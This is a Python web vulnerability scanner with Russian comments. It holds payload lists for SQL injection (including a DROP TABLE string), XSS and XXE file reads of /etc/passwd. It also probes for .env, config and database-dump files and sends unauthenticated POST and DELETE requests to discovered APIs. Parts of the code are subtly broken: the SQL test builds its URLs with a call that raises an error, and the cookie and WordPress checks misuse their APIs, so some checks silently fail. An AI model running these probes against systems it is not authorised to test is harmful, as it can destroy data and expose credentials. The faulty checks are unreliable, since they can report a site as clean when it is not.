#!/usr/bin/env python3
"""
Расширенный сканер безопасности для комплексной проверки веб-приложений
Включает тесты на основные категории уязвимостей веб-приложений
"""

import requests
import urllib.parse
import re
import time
import json
import ssl
import socket
from urllib.robotparser import RobotFileParser
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import sys
from pathlib import Path
from datetime import datetime
import hashlib

class EnhancedSecurityScanner:
    def __init__(self, base_url, delay=1.0, max_threads=10):
        self.base_url = base_url.rstrip('/')
        self.delay = delay
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Расширенные результаты сканирования
        self.results = {
            'basic_info': {},
            'ssl_security': {},
            'directory_listing': [],
            'path_traversal': [],
            'sql_injection': [],
            'xss_vulnerabilities': [],
            'csrf_vulnerabilities': [],
            'admin_panels': [],
            'sensitive_files': [],
            'configuration_issues': [],
            'technology_identification': {},
            'headers_security': {},
            'cookies_analysis': [],
            'authentication_issues': [],
            'injection_attacks': [],
            'file_upload_vulnerabilities': [],
            'xml_attacks': [],
            'command_injection': [],
            'ldap_injection': [],
            'template_injection': [],
            'exposed_endpoints': [],
            'api_security': {},
            'errors': []
        }
        
    def log(self, message, level="INFO"):
        """Логирование с временными метками"""
        timestamp = time.strftime("%H:%M:%S")
        colors = {
            "INFO": "📄",
            "SUCCESS": "✅",
            "WARNING": "⚠️",
            "ERROR": "❌",
            "CRITICAL": "🔴"
        }
        icon = colors.get(level, "📄")
        print(f"[{timestamp}] {icon} {level}: {message}")
        
    def make_request(self, url, method='GET', **kwargs):
        """Безопасный HTTP запрос с обработкой ошибок"""
        try:
            time.sleep(self.delay)
            kwargs.setdefault('timeout', 10)
            response = self.session.request(method, url, **kwargs)
            return response
        except requests.exceptions.RequestException as e:
            self.log(f"Ошибка запроса к {url}: {e}", "ERROR")
            return None
            
    def analyze_basic_info(self):
        """Базовая информация о сайте"""
        self.log("Получение базовой информации...")
        
        response = self.make_request(self.base_url)
        if not response:
            return
            
        # Основная информация
        self.results['basic_info'] = {
            'url': self.base_url,
            'status_code': response.status_code,
            'server': response.headers.get('Server', 'Не указан'),
            'ip_address': socket.gethostbyname(urllib.parse.urlparse(self.base_url).netloc) if urllib.parse.urlparse(self.base_url).netloc else None,
            'title': self.extract_title(response.text),
            'response_time': response.elapsed.total_seconds(),
            'content_length': len(response.text),
            'redirects': len(response.history),
            'final_url': response.url
        }
        
        self.log(f"Сервер: {self.results['basic_info']['server']}", "INFO")
        self.log(f"IP: {self.results['basic_info']['ip_address']}", "INFO")
        
    def analyze_ssl_security(self):
        """Анализ SSL/TLS безопасности"""
        self.log("Анализ SSL/TLS безопасности...")
        
        try:
            parsed_url = urllib.parse.urlparse(self.base_url)
            if parsed_url.scheme == 'https':
                # Проверяем SSL сертификат
                hostname = parsed_url.hostname
                
                # Создаем SSL контекст
                context = ssl.create_default_context()
                
                with socket.create_connection((hostname, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        
                        self.results['ssl_security'] = {
                            'certificate_valid': True,
                            'certificate_version': cert.get('version'),
                            'issuer': cert.get('issuer', {}),
                            'subject': cert.get('subject', {}),
                            'valid_from': cert.get('notBefore'),
                            'valid_until': cert.get('notAfter'),
                            'serial_number': cert.get('serialNumber'),
                            'cipher_suite': ssock.cipher(),
                            'protocol_version': ssock.version()
                        }
                        
                        self.log("SSL сертификат валидный", "SUCCESS")
            else:
                self.results['ssl_security'] = {
                    'certificate_valid': False,
                    'reason': 'Сайт не использует HTTPS'
                }
                self.log("Сайт не использует HTTPS", "WARNING")
                
        except Exception as e:
            self.results['ssl_security'] = {
                'certificate_valid': False,
                'error': str(e)
            }
            self.log(f"Ошибка анализа SSL: {e}", "ERROR")
            
    def test_sql_injection(self):
        """Тестирование на SQL инъекции"""
        self.log("Тестирование SQL инъекций...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users--",
            "1' OR '1'='1' --",
            "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a) --"
        ]
        
        # Параметры для тестирования
        test_params = ['id', 'user', 'name', 'search', 'query', 'page', 'filter', 'category']
        test_urls = [self.base_url + '/' + param for param in test_params]
        
        for url in test_urls:
            for payload in sql_payloads:
                test_url = url + f"?{urllib.parse.parse_qs(url.split('?')[1] if '?' in url else 'id=1')[0].split('=')[0]}={payload}"
                response = self.make_request(test_url)
                
                if response and response.status_code == 200:
                    # Проверяем признаки SQL ошибок
                    sql_error_patterns = [
                        r"mysql_fetch_array\(\)",
                        r"ORA-\d{5}",  # Oracle error
                        r"Microsoft.*ODBC.*SQL Server",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*mysql_",
                        r"valid MySQL result",
                        r"MySqlClient\."
                    ]
                    
                    for pattern in sql_error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.results['sql_injection'].append({
                                'url': test_url,
                                'payload': payload,
                                'error_pattern': pattern,
                                'status_code': response.status_code,
                                'severity': 'HIGH'
                            })
                            self.log(f"Возможная SQL инъекция: {test_url}", "WARNING")
                            break
                            
    def test_xss_vulnerabilities(self):
        """Тест на XSS уязвимости"""
        self.log("Тестирование XSS уязвимостей...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        test_params = ['q', 'search', 'name', 'comment', 'message', 'input']
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{self.base_url}?{param}={urllib.parse.quote(payload)}"
                response = self.make_request(test_url)
                
                if response and response.status_code == 200:
                    # Проверяем, отражается ли payload в ответе
                    if urllib.parse.unquote(payload) in response.text:
                        self.results['xss_vulnerabilities'].append({
                            'url': test_url,
                            'payload': payload,
                            'parameter': param,
                            'status_code': response.status_code,
                            'severity': 'MEDIUM'
                        })
                        self.log(f"Возможная XSS уязвимость: {test_url}", "WARNING")
                        
    def test_csrf_vulnerabilities(self):
        """Тест на CSRF уязвимости"""
        self.log("Поиск форм без CSRF защиты...")
        
        response = self.make_request(self.base_url)
        if not response:
            return
            
        # Ищем формы в коде
        forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
        
        csrf_protection_found = False
        
        for i, form in enumerate(forms):
            # Проверяем наличие CSRF токенов
            csrf_patterns = [
                r'csrf.*token',
                r'_token',
                r'authenticity_token',
                r'csrfmiddlewaretoken'
            ]
            
            has_csrf = False
            for pattern in csrf_patterns:
                if re.search(pattern, form, re.IGNORECASE):
                    has_csrf = True
                    csrf_protection_found = True
                    break
                    
            if not has_csrf and ('method="post"' in form.lower() or 'method=post' in form.lower()):
                # Найдена форма POST без CSRF защиты
                action_match = re.search(r'action=["\']([^"\']*)["\']', form)
                action = action_match.group(1) if action_match else 'Не указано'
                
                self.results['csrf_vulnerabilities'].append({
                    'form_number': i + 1,
                    'action': action,
                    'issue': 'Форма POST без CSRF токена',
                    'severity': 'MEDIUM'
                })
                self.log(f"Форма без CSRF защиты найдена: {action}", "WARNING")
                
        if csrf_protection_found:
            self.log("CSRF защита обнаружена", "SUCCESS")
            
    def analyze_headers_security(self):
        """Анализ заголовков безопасности"""
        self.log("Анализ заголовков безопасности...")
        
        response = self.make_request(self.base_url)
        if not response:
            return
            
        headers = dict(response.headers)
        
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': None,  # HSTS
            'Content-Security-Policy': None,
            'Referrer-Policy': None,
            'Permissions-Policy': None
        }
        
        present_headers = {}
        missing_headers = []
        
        for header, expected_values in security_headers.items():
            if header in headers:
                present_headers[header] = headers[header]
                
                # Проверяем корректность значения
                if expected_values is not None:
                    if isinstance(expected_values, list):
                        if headers[header] not in expected_values:
                            self.results['configuration_issues'].append({
                                'type': 'Security Header',
                                'header': header,
                                'current_value': headers[header],
                                'recommended_value': expected_values,
                                'severity': 'LOW'
                            })
                    else:
                        if headers[header] != expected_values:
                            self.results['configuration_issues'].append({
                                'type': 'Security Header',
                                'header': header,
                                'current_value': headers[header],
                                'recommended_value': expected_values,
                                'severity': 'LOW'
                            })
            else:
                missing_headers.append(header)
                
        self.results['headers_security'] = {
            'present_headers': present_headers,
            'missing_headers': missing_headers,
            'total_security_headers': len(present_headers),
            'missing_security_headers': len(missing_headers)
        }
        
        if missing_headers:
            self.log(f"Отсутствуют заголовки безопасности: {', '.join(missing_headers)}", "WARNING")
        else:
            self.log("Все основные заголовки безопасности присутны", "SUCCESS")
            
    def find_directory_listing(self):
        """Поиск уязвимости directory listing"""
        self.log("Поиск directory listing...")
        
        directories = [
            '/admin/', '/wp-admin/', '/administrator/', '/phpmyadmin/',
            '/backup/', '/backups/', '/config/', '/includes/',
            '/templates/', '/themes/', '/uploads/', '/files/',
            '/images/', '/css/', '/js/', '/assets/',
            '/logs/', '/tmp/', '/temp/', '/cache/',
            '/.git/', '/.svn/', '/.env/', '/.htaccess',
            '/api/', '/v1/', '/v2/', '/api/v1/', '/api/v2/'
        ]
        
        for directory in directories:
            url = self.base_url + directory
            response = self.make_request(url)
            
            if response and response.status_code == 200:
                # Проверяем признаки directory listing
                if any(indicator in response.text.lower() for indicator in [
                    'index of', 'parent directory', 'directory listing',
                    '[dir]', '[file]', 'name</th>', 'last modified',
                    '<a href="../', '<a href="./'
                ]):
                    self.results['directory_listing'].append({
                        'url': url,
                        'status_code': response.status_code,
                        'content_length': len(response.text),
                        'severity': 'HIGH'
                    })
                    self.log(f"Найден directory listing: {url}", "WARNING")
                    
    def find_sensitive_files(self):
        """Поиск чувствительных файлов"""
        self.log(f"Поиск чувствительных файлов...")
        
        sensitive_files = [
            '/.env', '/.htaccess', '/.htpasswd', '/web.config',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/test.php', '/config.php',
            '/database.php', '/db.php', '/settings.php', '/config.ini',
            '/.git/config', '/.svn/entries', '/composer.json',
            '/package.json', '/yarn.lock', '/package-lock.json',
            '/admin-config.php', '/wp-config.php', '/configuration.php',
            '/config.json', '/app.config', '/application.properties',
            '/.DS_Store', '/Thumbs.db', '/backup.sql', '/dump.sql'
        ]
        
        for file_path in sensitive_files:
            url = self.base_url + file_path
            response = self.make_request(url)
            
            if response and response.status_code == 200:
                # Проверяем содержимое файла на наличие чувствительной информации
                content_preview = response.text[:500] + ('...' if len(response.text) > 500 else '')
                
                sensitive_patterns = [
                    r'password\s*=\s*["\'].*["\']',
                    r'api[_-]?key\s*=\s*["\'].*["\']',
                    r'secret[_-]?key\s*=\s*["\'].*["\']',
                    r'database[_-]?password\s*=\s*["\'].*["\']',
                    r'mysql.*password.*=',
                    r'connectionstring.*password',
                    r'pwd=.*password',
                ]
                
                sensitivity_detected = any(re.search(pattern, content_preview, re.IGNORECASE) 
                                         for pattern in sensitive_patterns)
                
                self.results['sensitive_files'].append({
                    'url': url,
                    'status_code': response.status_code,
                    'content_length': len(response.text),
                    'content_preview': content_preview,
                    'has_sensitive_data': sensitivity_detected,
                    'severity': 'HIGH' if sensitivity_detected else 'MEDIUM'
                })
                
                severity_level = "CRITICAL" if sensitivity_detected else "WARNING"
                self.log(f"Найден чувствительный файл: {url}", severity_level)
                
    def identify_technologies(self):
        """Идентификация используемых технологий"""
        self.log("Идентификация технологий...")
        
        technologies = {
            'Web Server': [],
            'CMS': [],
            'Programming Language': [],
            'JavaScript Framework': [],
            'CSS Framework': [],
            'Database': [],
            'Other': []
        }
        
        response = self.make_request(self.base_url)
        if not response:
            return
            
        headers = dict(response.headers)
        html_content = response.text
        
        # Анализ заголовков
        server_header = headers.get('Server', '').lower()
        set_cookie = headers.get('Set-Cookie', '').lower()
        
        # Веб-серверы
        if 'nginx' in server_header:
            technologies['Web Server'].append('Nginx')
        elif 'apache' in server_header:
            technologies['Web Server'].append('Apache')
        elif 'iis' in server_header:
            technologies['Web Server'].append('IIS')
            
        # CMS системы
        cms_patterns = [
            (r'wp-content', 'WordPress'),
            (r'wp-json', 'WordPress'),
            (r'/admin/login.asp', 'Joomla'),
            (r'joomla_session', 'Joomla'),
            (r'/bitrix/admin/', 'Bitrix'),
            (r'bx-onload', 'Bitrix'),
            (r'/concrete/css/', 'Concrete5'),
            (r'drupal', 'Drupal')
        ]
        
        for pattern, cms in cms_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                technologies['CMS'].append(cms)
                
        # Языки программирования
        if 'php' in server_header or '.php' in html_content:
            technologies['Programming Language'].append('PHP')
        if 'asp' in server_header or '.asp' in html_content:
            technologies['Programming Language'].append('ASP.NET')
        if 'python' in headers.get('X-Powered-By', ''):
            technologies['Programming Language'].append('Python')
        if 'node' in headers.get('X-Powered-By', '').lower():
            technologies['Programming Language'].append('Node.js')
            
        # JavaScript фреймворки
        js_patterns = [
            (r'jquery', 'jQuery'),
            (r'react', 'React'),
            (r'vue\.js', 'Vue.js'),
            (r'angular', 'Angular'),
            (r'bootstrap', 'Bootstrap')
        ]
        
        for pattern, framework in js_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                technologies['JavaScript Framework'].append(framework)
                
        # Базы данных
        if 'wordpress' in technologies.get('CMS', []):
            technologies['Database'].append('MySQL (предположительно)')
            
        self.results['technology_identification'] = technologies
        
        # Выводим найденные технологии
        for category, techs in technologies.items():
            if techs:
                self.log(f"{category}: {', '.join(techs)}", "INFO")
                
    def test_file_upload_vulnerabilities(self):
        """Поиск уязвимостей загрузки файлов"""
        self.log("Поиск функций загрузки файлов...")
        
        # Ищем форму загрузки файлов
        response = self.make_request(self.base_url)
        if not response:
            return
            
        upload_forms = re.findall(r'enctype=["\']multipart/form-data["\'][^>]*>(.*?)</form>', 
                                 response.text, re.DOTALL | re.IGNORECASE)
        
        for i, form in enumerate(upload_forms):
            file_inputs = re.findall(r'input[^>]*type=["\']file["\'][^>]*>', form, re.IGNORECASE)
            
            for file_input in file_inputs:
                # Извлекаем информацию о поле загрузки
                name_match = re.search(r'name=["\']([^"\']+)["\']', file_input)
                name = name_match.group(1) if name_match else f"file_{i}"
                
                self.results['file_upload_vulnerabilities'].append({
                    'form_number': i + 1,
                    'input_field': name,
                    'issue': 'Обнаружена форма загрузки файлов',
                    'recommendations': [
                        'Ограничить типы допустимых файлов',
                        'Проверять содержимое файлов',
                        'Загружать файлы в безопасную директорию',
                        'Переименовывать загруженные файлы'
                    ],
                    'severity': 'MEDIUM'
                })
                self.log(f"Обнаружена форма загрузки файлов: {name}", "INFO")
                
    def test_api_endpoints(self):
        """Поиск и тестирование API endpoint'ов"""
        self.log("Поиск API endpoint'ов...")
        
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/api/v3/',
            '/rest/', '/graphql/', '/json/', '/xml/',
            '/v1/', '/v2/', '/v3/', '/webservice/'
        ]
        
        for path in api_paths:
            url = self.base_url + path
            response = self.make_request(url)
            
            if response and response.status_code in [200, 401, 403]:
                # Проверяем заголовок Content-Type для определения API
                content_type = response.headers.get('Content-Type', '')
                
                is_api = (
                    'application/json' in content_type or
                    'application/xml' in content_type or
                    'application/json' in content_type.lower() or
                    any(keyword in url.lower() for keyword in ['api', 'rest', 'json'])
                )
                
                if is_api:
                    self.results['exposed_endpoints'].append({
                        'url': url,
                        'status_code': response.status_code,
                        'content_type': content_type,
                        'content_length': len(response.text) if response.text else 0,
                        'methods_tested': ['GET'],
                        'severity': 'MEDIUM'
                    })
                    self.log(f"Найден API endpoint: {url}", "INFO")
                    
        # Тестируем методы HTTP
        for endpoint in self.results['exposed_endpoints']:
            url = endpoint['url']
            
            methods_to_test = ['POST', 'PUT', 'DELETE', 'PATCH']
            for method in methods_to_test:
                if method == 'POST' or method == 'DELETE':
                    response = self.make_request(url, method=method)
                    if response and response.status_code != 404:
                        endpoint['methods_tested'].append(method)
                        endpoint['severity'] = 'HIGH'
                        self.log(f"API поддерживает {method}: {url}", "WARNING")
                        
    def test_xml_injection(self):
        """Тестирование XML/XXE атак"""
        self.log("Тестирование XML/XXE атак...")
        
        xml_payloads = [
            '<?xml version="1.0"?><data>test</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts">]><data>&xxe;</data>'
        ]
        
        # Ищем XML endpoints
        xml_endpoints = ['/xml', '/api/xml', '/soap', '/rpc']
        
        for endpoint in xml_endpoints:
            url = self.base_url + endpoint
            
            for payload in xml_payloads:
                headers = {'Content-Type': 'application/xml'}
                response = self.make_request(url, method='POST', 
                                          data=payload, headers=headers)
                
                if response and response.status_code in [200, 500]:
                    # Проверяем наличие файлового содержимого
                    if any(indicator in response.text.lower() for indicator in [
                        'root:x:', 'bin/bash', 'localhost', '127.0.0.1'
                    ]):
                        self.results['xml_attacks'].append({
                            'url': url,
                            'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                            'response_preview': response.text[:200] + '...',
                            'severity': 'CRITICAL'
                        })
                        self.log(f"Возможная XXE уязвимость: {url}", "CRITICAL")
                        
    def find_admin_panels(self):
        """Поиск административных панелей"""
        self.log("Поиск административных панелей...")
        
        admin_paths = [
            '/admin', '/wp-admin', '/administrator', '/phpmyadmin',
            '/admin.php', '/login.php', '/admin/login', '/dashboard',
            '/control', '/manage', '/panel', '/cpanel', '/webmail',
            '/admin/index.php', '/admin/login.php', '/admin/dashboard.php',
            '/manager', '/administration', '/console', '/console.aspx'
        ]
        
        for path in admin_paths:
            url = self.base_url + path
            response = self.make_request(url)
            
            if response and response.status_code in [200, 401, 403]:
                if any(indicator in response.text.lower() for indicator in [
                    'login', 'password', 'username', 'admin', 'dashboard',
                    'control panel', 'administration', 'wp-login', 'signin'
                ]):
                    admin_info = {
                        'url': url,
                        'status_code': response.status_code,
                        'title': self.extract_title(response.text),
                        'has_login_form': 'form' in response.text.lower() and 'password' in response.text.lower(),
                        'severity': 'HIGH'
                    }
                    
                    # Проверяем на возможность автоматического входа
                    if response.status_code == 200 and 'dashboard' in response.text.lower():
                        admin_info['possible_default_login'] = True
                        admin_info['severity'] = 'CRITICAL'
                        self.log(f"Возможна автоматическая авторизация: {url}", "CRITICAL")
                    
                    self.results['admin_panels'].append(admin_info)
                    self.log(f"Найдена админ панель: {url}", "WARNING")
                    
    def analyze_cookies(self):
        """Анализ безопасности cookies"""
        self.log("Анализ cookies...")
        
        response = self.make_request(self.base_url)
        if not response:
            return
            
        cookies = response.cookies
        
        for cookie in cookies:
            cookie_info = {
                'name': cookie.name,
                'value': cookie.value[:50] + '...' if len(cookie.value) > 50 else cookie.value,
                'domain': cookie.domain,
                'path': cookie.path,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('HttpOnly'),
                'samesite': cookie.get('SameSite', 'Не указан'),
                'expires': str(cookie.expires) if cookie.expires else 'Session cookie'
            }
            
            # Проверяем безопасность
            security_issues = []
            severity = 'LOW'
            
            if not cookie_info['secure'] and cookie_info['name'].lower() in ['session', 'auth', 'token']:
                security_issues.append('Cookie не помечен как Secure')
                severity = 'MEDIUM'
                
            if not cookie_info['httponly'] and cookie_info['name'].lower() in ['session', 'auth', 'token']:
                security_issues.append('Cookie не помечен как HttpOnly')
                severity = 'MEDIUM'
                
            if cookie_info['samesite'] == 'Не указан':
                security_issues.append('Не указан SameSite')
                
            cookie_info['security_issues'] = security_issues
            cookie_info['severity'] = severity
            
            if security_issues:
                self.log(f"Найдены проблемы в cookie '{cookie_info['name']}': {', '.join(security_issues)}", "WARNING")
                
            self.results['cookies_analysis'].append(cookie_info)
            
    def extract_title(self, html_content):
        """Извлечение заголовка страницы"""
        title_match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
        return title_match.group(1).strip() if title_match else "No title"
        
    def run_comprehensive_scan(self):
        """Запуск комплексного сканирования"""
        start_time = time.time()
        self.log(f"🔍 Начинаем комплексное сканирование {self.base_url}")
        
        # Базовый анализ
        self.analyze_basic_info()
        self.analyze_ssl_security()
        
        # Поиск уязвимостей
        tests = [
            self.find_directory_listing,
            self.find_sensitive_files,
            self.find_admin_panels,
            self.identify_technologies,
            self.analyze_headers_security,
            self.test_file_upload_vulnerabilities,
            self.test_api_endpoints,
            self.analyze_cookies
        ]
        
        # Инъекционные атаки (более интенсивные тесты)
        injection_tests = [
            self.test_sql_injection,
            self.test_xss_vulnerabilities,
            self.test_xml_injection
        ]
        
        # Запускаем основные тесты
        for test in tests:
            try:
                test()
            except Exception as e:
                self.log(f"Ошибка при выполнении {test.__name__}: {e}", "ERROR")
                self.results['errors'].append(f"{test.__name__}: {e}")
                
        # Запускаем инъекционные тесты с задержкой
        self.log("🚀 Запуск инъекционных тестов", "INFO")
        for test in injection_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Ошибка при выполнении {test.__name__}: {e}", "ERROR")
                self.results['errors'].append(f"{test.__name__}: {e}")
                
        end_time = time.time()
        scan_duration = end_time - start_time
        
        self.log(f"✅ Сканирование завершено за {scan_duration:.2f} секунд", "SUCCESS")
        
    def save_results(self, filename='enhanced_security_report.json'):
        """Сохранение результатов сканирования"""
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, ensure_ascii=False, indent=2)
        self.log(f"📄 Результаты сохранены в {filename}")
        
    def generate_summary(self):
        """Генерация сводки результатов"""
        total_issues = 0
        critical_issues = 0
        high_issues = 0
        medium_issues = 0
        low_issues = 0
        
        # Подсчитываем проблемы по категориям
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        
        for category, items in self.results.items():
            if isinstance(items, list):
                for item in items:
                    if isinstance(item, dict) and 'severity' in item:
                        sev = item['severity']
                        if sev in severity_counts:
                            severity_counts[sev] += 1
            
            elif isinstance(items, dict):
                if 'severity' in items:
                    sev = items['severity']
                    if sev in severity_counts:
                        severity_counts[sev] += 1
                        
        critical_issues = severity_counts['CRITICAL']
        high_issues = severity_counts['HIGH']
        medium_issues = severity_counts['MEDIUM']
        low_issues = severity_counts['LOW']
        total_issues = critical_issues + high_issues + medium_issues + low_issues
        
        summary = {
            'target_url': self.base_url,
            'scan_timestamp': datetime.now().isoformat(),
            'total_issues': total_issues,
            'critical_issues': critical_issues,
            'high_issues': high_issues,
            'medium_issues': medium_issues,
            'low_issues': low_issues,
            'categories_found': len([k for k, v in self.results.items() if v and k != 'errors']),
            'errors_during_scan': len(self.results['errors'])
        }
        
        return summary
        
    def print_summary(self):
        """Вывод сводки результатов"""
        summary = self.generate_summary()
        
        print("\n" + "="*80)
        print("📊 СВОДКА РЕЗУЛЬТАТОВ КОМПЛЕКСНОГО СКАНИРОВАНИЯ БЕЗОПАСНОСТИ")
        print("="*80)
        
        print(f"🎯 Цель         : {summary['target_url']}")
        print(f"⏱️  Время сканирования: {summary['scan_timestamp']}")
        print(f"📂 Категорий найдено: {summary['categories_found']}")
        
        print("\n🔍 НАЙДЕННЫЕ ПРОБЛЕМЫ ПО УРОВНЯМ КРИТИЧНОСТИ:")
        print(f"🔴 КРИТИЧЕСКИЕ : {summary['critical_issues']}")
        print(f"🟠 ВЫСОКИЕ     : {summary['high_issues']}")
        print(f"🟡 СРЕДНИЕ     : {summary['medium_issues']}")
        print(f"🔵 НИЗКИЕ      : {summary['low_issues']}")
        print(f"📊 ВСЕГО       : {summary['total_issues']}")
        
        if summary['errors_during_scan'] > 0:
            print(f"\n⚠️  Ошибок во время сканирования: {summary['errors_during_scan']}")
            
        print("\n" + "="*80)

def main():
    parser = argparse.ArgumentParser(description='Расширенный сканер безопасности')
    parser.add_argument('--url', required=True, help='URL для сканирования')
    parser.add_argument('--delay', type=float, default=1.0, help='Задержка между запросами (сек)')
    parser.add_argument('--output', default='enhanced_security_report.json', help='Файл для сохранения результатов')
    parser.add_argument('--threads', type=int, default=5, help='Максимальное количество потоков')
    
    args = parser.parse_args()
    
    print("🔐 Расширенный сканер безопасности")
    print("⚠️  ВНИМАНИЕ: Используйте только на собственных сайтах!")
    print(f"🎯 Цель: {args.url}")
    print(f"⏱️  Задержка: {args.delay} сек")
    print(f"🧵 Потоков: {args.threads}")
    print("-" * 80)
    
    scanner = EnhancedSecurityScanner(args.url, args.delay, args.threads)
    
    try:
        scanner.run_comprehensive_scan()
        scanner.print_summary()
        scanner.save_results(args.output)
        
    except KeyboardInterrupt:
        print("\n❌ Сканирование прервано пользователем")
        scanner.save_results(args.output)
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        scanner.save_results(args.output)

if __name__ == "__main__":
    main()
